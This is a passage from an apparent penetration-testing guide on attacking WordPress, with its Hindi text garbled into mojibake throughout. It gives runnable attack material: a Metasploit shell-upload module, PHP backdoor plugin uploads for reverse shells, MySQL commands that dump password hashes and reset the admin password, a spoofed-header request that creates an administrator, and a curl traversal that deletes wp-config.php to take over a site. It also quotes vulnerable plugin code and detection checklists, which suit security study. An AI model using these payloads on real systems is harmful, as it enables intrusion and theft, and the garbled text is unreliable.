рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЦреЛрдЬреЗрдВ рдХрд┐ рдЖрдк рдЙрд╕ рдЕрдкрдбреЗрдЯ рдХреА рдЧрдИ рдкреЗрдЬ рддрдХ рдХреИрд╕реЗ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдкрдХреЛ рдпрд╣рд╛рдБ рдПрдХреНрд╕реЗрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ .php рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдПрдХ plugin рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдЕрдкрдиреЗ php backdoor рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдВ:

![](<../../images/image (183).png>)

рдлрд┐рд░ рдПрдХ рдирдпрд╛ plugin рдЬреЛрдбрд╝реЗрдВ:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Procced рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](<../../images/image (70).png>)

рд╢рд╛рдпрдж рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдХреБрдЫ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдк Media рдкрд░ рдЬрд╛рдПрдВ, рддреЛ рдЖрдк рдЕрдкрдирд╛ shell рдЕрдкрд▓реЛрдб рд╣реБрдЖ рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (462).png>)

рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ рдФрд░ рдЖрдк reverse shell рдХреЛ execute рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

рдпрд╣ рддрд░реАрдХрд╛ рдПрдХ vulnerable рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ malicious plugin рдХреА installation рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдЗрд╕реЗ exploit рдХрд░рдХреЗ web shell рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ WordPress dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **Plugin Acquisition**: Plugin рдХреЛ Exploit DB рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard рдкрд░ рдЬрд╛рдПрдВ, рдлрд┐рд░ `Dashboard > Plugins > Upload Plugin` рдкрд░ рдЬрд╛рдПрдВред
- рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ plugin рдХреА zip рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. **Plugin Activation**: рдПрдХ рдмрд╛рд░ plugin рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЗрд╕реЗ dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ activate рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
4. **Exploitation**:
- рдЬрдм plugin "reflex-gallery" рдЗрдВрд╕реНрдЯреЙрд▓ рдФрд░ activated рд╣реЛ, рддреЛ рдЗрд╕реЗ exploit рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ vulnerable рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред
- Metasploit framework рдЗрд╕ vulnerability рдХреЗ рд▓рд┐рдП рдПрдХ exploit рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрдкрдпреБрдХреНрдд module рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ specific commands execute рдХрд░рдХреЗ, рдПрдХ meterpreter session рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ site рддрдХ unauthorized access рджреЗрддрд╛ рд╣реИред
- рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ WordPress рд╕рд╛рдЗрдЯ рдХреЛ exploit рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рд╕рд┐рд░реНрдл рдПрдХ рд╣реИред

рдпрд╣ рд╕рд╛рдордЧреНрд░реА WordPress dashboard рдореЗрдВ plugin рдЗрдВрд╕реНрдЯреЙрд▓ рдФрд░ activate рдХрд░рдиреЗ рдХреЗ рдЪрд░рдгреЛрдВ рдХрд╛ рджреГрд╢реНрдп рдкреНрд░рджрд░реНрд╢рди рдХрд░рддреА рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдмрд┐рдирд╛ рдЙрдЪрд┐рдд рдЕрдиреБрдорддрд┐ рдХреЗ рдЗрд╕ рддрд░рд╣ kwetsbaarрддрд╛рдПрдБ exploit рдХрд░рдирд╛ рдЧреИрд░рдХрд╛рдиреВрдиреА рдФрд░ рдЕрдиреИрддрд┐рдХ рд╣реИред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдФрд░ рдХреЗрд╡рд▓ рдХрд╛рдиреВрдиреА рд╕рдВрджрд░реНрдн рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ explicit permission рдХреЗ рд╕рд╛рде penetration testingред

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ рдПрдХ script рд╣реИ рдЬрд┐рд╕реЗ WordPress рдореЗрдВ Cross-Site Scripting (XSS) vulnerability рдХреЛ Remote Code Execution (RCE) рдпрд╛ рдЕрдиреНрдп critical vulnerabilities рдореЗрдВ escalate рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) рджреЗрдЦреЗрдВред рдпрд╣ **Wordpress Versions 6.X.X, 5.X.X рдФрд░ 4.X.X** рдХрд╛ рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рдореНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
рдПрдбрдорд┐рди рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress рдкреНрд▓рдЧрдЗрдиреНрд╕ Pentest

### Attack Surface

рдпрд╣ рдЬрд╛рдирдирд╛ рдХрд┐ рдХреЛрдИ Wordpress plugin рдХрд┐рд╕ рддрд░рд╣ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ expose рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрд╕рдХреА functionality рдореЗрдВ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдмреБрд▓реЗрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ plugin functionality рдХреЛ рдХреИрд╕реЗ expose рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ vulnerable plugins рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) рдореЗрдВ рджрд┐рдП рдЧрдП рд╣реИрдВред

- **`wp_ajax`**

рдПрдХ рддрд░реАрдХреЗ рдЬрд┐рдирд╕реЗ рдПрдХ plugin functions рдХреЛ expose рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рд╡рд╣ AJAX handlers рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИред рдЗрдирдореЗрдВ logic, authorization, рдпрд╛ authentication рдмрдЧ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдХреНрд╕рд░ рдпреЗ functions authentication рдФрд░ authorization рджреЛрдиреЛрдВ рдХреЛ рдПрдХ wordpress nonce рдХреА рдореМрдЬреВрджрдЧреА рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ **any user authenticated in the Wordpress instance might have** (рдЗрд╕рдХреЗ role рд╕реЗ рд╕реНрд╡рддрдВрддреНрд░)ред  

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд functions рд╡реЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ plugin рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ expose рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` рдХрд╛ рдЙрдкрдпреЛрдЧ endpoint рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ) рдХреЗ рд▓рд┐рдП рд╕реБрд▓рдн рдмрдирд╛рддрд╛ рд╣реИред**

> [!CAUTION]
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдЧрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ `wp_verify_nonce` рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рдХреА рдЬрд╛рдБрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реИ; рдпрд╣ рдЖрдо рддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдХрдо-рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬрд╝ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ-рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬрд╝ рд╡рд╛рд▓реА рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

- **REST API**

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ `register_rest_route` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ wordpress рд╕реЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХреЛ REST API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд┐рдпрд╛ рдЬрд╛рдП:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` рдПрдХ callback рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ API рдореЗрдердб рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВред

**рдпрджрд┐ рдмрд┐рд▓реНрдЯ-рдЗрди `__return_true` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдпреВрдЬрд╝рд░ рдкрд░рдорд┐рд╢рди рдЪреЗрдХ рдХреЛ рд╕реАрдзреЗ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрдЧрд╛ред**

- **php рдлрд╝рд╛рдЗрд▓ рддрдХ рд╕реАрдзреЗ рдПрдХреНрд╕реЗрд╕**

рдмреЗрд╢рдХ, Wordpress PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ plugins рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╛рдЗрд▓реЗрдВ рд╡реЗрдм рд╕реЗ рд╕реАрдзреЗ рдкрд╣реБрдБрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдХреЛрдИ plugin рдХреЛрдИ vulnerable functionality рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рд╕рд┐рд░реНрдл рдлрд╛рдЗрд▓ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдорд╛рддреНрд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╡рд╣ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ exploitable рд╣реЛрдЧреАред

### Trusted-header REST impersonation (WooCommerce Payments тЙд 5.6.1)

рдХреБрдЫ plugins internal integrations рдпрд╛ reverse proxies рдХреЗ рд▓рд┐рдП тАЬtrusted headerтАЭ shortcuts рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕ header рдХрд╛ рдЙрдкрдпреЛрдЧ REST requests рдХреЗ рд▓рд┐рдП current user context рд╕реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рдХрд░рддреЗ рд╣реИрдВред рдпрджрд┐ рд╡рд╣ header upstream component рджреНрд╡рд╛рд░рд╛ request рд╕реЗ cryptographically рдмрд╛рдЙрдВрдб рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ attacker рдЙрд╕реЗ spoof рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ administrator рдХреЗ рд░реВрдк рдореЗрдВ privileged REST routes рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИред

- рдкреНрд░рднрд╛рд╡: рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ privilege escalation рдХрд░рдХреЗ admin рдмрдирдиреЗ рдХрд╛ рд░рд╛рд╕реНрддрд╛ тАФ core users REST route рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирдпрд╛ administrator рдмрдирд╛рдХрд░ред
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (рдпрд╣ user ID 1 рдЬрдмрд░рджрд╕реНрддреА рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ, рдЖрдо рддреМрд░ рдкрд░ рдкрд╣рд▓рд╛ administrator рдЕрдХрд╛рдЙрдВрдЯ)ред
- Exploited route: `POST /wp-json/wp/v2/users` рдПрдХ elevated role array рдХреЗ рд╕рд╛рдеред

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
рдХреНрдпреЛрдВ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

- рдкреНрд▓рдЧрдЗрди рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ-рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЗрдбрд░ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрдерд┐рддрд┐ рд╕реЗ рдореИрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ capability checks рдХреЛ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрддрд╛ рд╣реИред
- WordPress core рдЗрд╕ route рдХреЗ рд▓рд┐рдП `create_users` capability рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ; рдкреНрд▓рдЧрдЗрди hack рдЗрд╕реЗ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ рджреНрд╡рд╛рд░рд╛ рд╣реЗрдбрд░ рд╕реЗ рд╕реАрдзреЗ current user context рд╕реЗрдЯ рдХрд░рдХреЗред

рдЕрдкреЗрдХреНрд╖рд┐рдд рд╕рдлрд▓рддрд╛ рд╕рдВрдХреЗрдд

- HTTP 201 рдХреЗ рд╕рд╛рде рдПрдХ JSON рдмреЙрдбреА рдЬреЛ рдмрдирд╛рдП рдЧрдП user рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддреА рд╣реИред
- рдПрдХ рдирдпрд╛ admin user рдЬреЛ `wp-admin/users.php` рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИред

рдбрд┐рдЯреЗрдХреНрд╢рди рдЪреЗрдХрд▓рд┐рд╕реНрдЯ

- Grep рдХрд░рдХреЗ рдЦреЛрдЬреЗрдВ `getallheaders()`, `$_SERVER['HTTP_...']`, рдпрд╛ vendor SDKs рдЬреЛ custom headers рдкрдврд╝рдХрд░ user context рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- REST registrations рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдРрд╕реЗ privileged callbacks рдорд┐рд▓реЗрдВ рдЬрд┐рдирдореЗрдВ рдордЬрдмреВрдд `permission_callback` checks рдирд╣реАрдВ рд╣реИрдВ рдФрд░ рдЬреЛ request headers рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред
- рдРрд╕реЗ рдЙрдкрдпреЛрдЧ рдвреВрдБрдвреЗрдВ рдЬрд╣рд╛рдБ core user-management functions (`wp_insert_user`, `wp_create_user`) REST handlers рдХреЗ рдЕрдВрджрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдХреЗрд╡рд▓ header values рд╕реЗ gated рд╣реИрдВред

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes рдФрд░ plugins рдЕрдХреНрд╕рд░ `wp_ajax_` рдФрд░ `wp_ajax_nopriv_` hooks рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ AJAX handlers рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддреЗ рд╣реИрдВред  рдЬрдм **_nopriv_** variant рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ **callback рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд рд╡рд┐рдЬрд╝рд┐рдЯрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХрд┐рд╕реА рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рд░реВрдк рд╕реЗ рдпрд╣ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:

1. рдПрдХ **capability check** (рдЙрджрд╛. `current_user_can()` рдпрд╛ рдХрдо рд╕реЗ рдХрдо `is_user_logged_in()`), рдФрд░
2. рдПрдХ **CSRF nonce** рдЬрд┐рд╕реЗ `check_ajax_referer()` / `wp_verify_nonce()` рдХреЗ рд╕рд╛рде validate рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдФрд░
3. **Strict input sanitisation / validation**ред

The Litho multipurpose theme (< 3.1) рдиреЗ рдЗрди рддреАрди рдХрдВрдЯреНрд░реЛрд▓реНрд╕ рдХреЛ *Remove Font Family* рдлреАрдЪрд░ рдореЗрдВ рднреВрд▓ рдЧрдпрд╛ рдерд╛ рдФрд░ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб (рд╕рд░рд▓реАрдХреГрдд) рд╢рд┐рдк рд╣реЛ рдЧрдпрд╛:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Unauthenticated access** тАУ the `wp_ajax_nopriv_` hook рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **No nonce / capability check** тАУ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ endpoint рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИред
* **No path sanitisation** тАУ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛тАУрдирд┐рдпрдВрддреНрд░рд┐рдд `fontfamily` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдмрд┐рдирд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрде рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝ рджреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ `../../` traversal рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

#### Exploitation

рдПрдХ attacker рдПрдХ рд╣реА HTTP POST рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ **uploads base directory рдХреЗ рдиреАрдЪреЗ** (рдЖрдо рддреМрд░ рдкрд░ `<wp-root>/wp-content/uploads/`) рд╕реЗ рдбрд┐рд▓реАрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### рдбрд┐рдЯреЗрдХреНрд╢рди рдЪреЗрдХрд▓рд┐рд╕реНрдЯ

* рдХреЛрдИ рднреА `add_action( 'wp_ajax_nopriv_...')` callback рдЬреЛ filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, рдЖрджрд┐) рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реЛред
* paths рдореЗрдВ unsanitised user input рдХрд╛ concatenation (рджреЗрдЦреЗрдВ: `$_POST`, `$_GET`, `$_REQUEST`)ред
* `check_ajax_referer()` рдФрд░ `current_user_can()`/`is_user_logged_in()` рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ред

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (тЙд 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
рдХреНрдпреЛрдВ рдпрд╣ exploitable рд╣реИ

- рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб authorization рдХреЗ рдмрд┐рдирд╛ `$_REQUEST['reset-for']` рдФрд░ рдПрдХ plugin option рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИред
